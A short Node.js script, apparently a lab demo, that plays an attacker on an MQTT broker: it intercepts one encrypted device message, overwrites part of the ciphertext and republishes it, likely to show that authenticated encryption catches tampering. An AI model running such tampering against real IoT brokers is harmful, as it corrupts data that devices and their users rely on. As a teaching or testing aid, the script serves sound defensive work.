import mqtt from 'mqtt';
import 'dotenv/config';

const BROKER_URL = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
const client = mqtt.connect(BROKER_URL, { clientId: 'attacker_tamper' });

console.log('\x1b[31m😈 [ATTACK] TAMPER MODE: Listening...\x1b[0m');

client.on('connect', () => {
    client.subscribe('device/+/data');
});

client.on('message', (topic, message) => {
    // Prevent loops: Ignore our own attacks
    if (message.toString().includes('CORRUPT')) return;

    client.unsubscribe('device/+/data'); // Stop after catching one

    const payload = message.toString();
    const parts = payload.split(':');
    
    if (parts.length === 3) {
        console.log(`\x1b[31m⚡ [ATTACK] Intercepted Packet on ${topic}\x1b[0m`);
        
        // CORRUPTION: Change the last char of the ciphertext
        const originalCipher = parts[1];
        const corruptedCipher = originalCipher.slice(0, -5) + 'AAAAA'; 
        
        const fakeMessage = `${parts[0]}:${corruptedCipher}:${parts[2]}`;
        
        console.log('\x1b[31m🔨 [ATTACK] Modifying Ciphertext bits...\x1b[0m');
        client.publish(topic, fakeMessage);
        console.log('\x1b[31m📤 [ATTACK] Sent Corrupted Packet!\x1b[0m');
        
        setTimeout(() => process.exit(0), 500);
    }
});